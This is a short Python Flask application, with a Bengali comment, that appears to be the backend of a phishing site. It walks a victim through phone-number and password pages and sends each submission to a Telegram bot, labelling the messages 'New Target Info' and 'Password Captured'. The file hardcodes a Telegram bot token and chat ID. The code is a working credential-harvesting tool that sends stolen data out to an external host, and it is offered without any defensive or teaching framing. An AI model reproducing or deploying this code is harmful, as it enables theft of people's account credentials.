from flask import Flask, render_template, request, redirect, url_for
import requests

app = Flask(__name__)

# আপনার টেলিগ্রাম বট টোকেন এবং চ্যাট আইডি এখানে বসানো আছে
TELEGRAM_BOT_TOKEN = "8680709433:AAE2M6j2cyJ65UkoPr0_ObXsmV6xO8TU72w"  
TELEGRAM_CHAT_ID = "7162958713"      

def send_to_telegram(message):
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        payload = {
            "chat_id": TELEGRAM_CHAT_ID,
            "text": message,
            "parse_mode": "Markdown"
        }
        requests.post(url, json=payload)
    except Exception as e:
        print(f"Error: {e}")

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/phone', methods=['POST', 'GET'])
def phone():
    if request.method == 'POST':
        user_input = request.form.get('phone')
        send_to_telegram(f"👤 *New Target Info*\n🔗 Profile/Input: `{user_input}`")
        return redirect(url_for('password'))
    return render_template('phone.html')

@app.route('/password', methods=['POST', 'GET'])
def password():
    if request.method == 'POST':
        pwd_input = request.form.get('password')
        send_to_telegram(f"🔑 *Password Captured*\n🔒 Password: `{pwd_input}`")
        return redirect(url_for('success'))
    return render_template('password.html')

@app.route('/success')
def success():
    return render_template('success.html')

if __name__ == '__main__':
    app.run(debug=True)
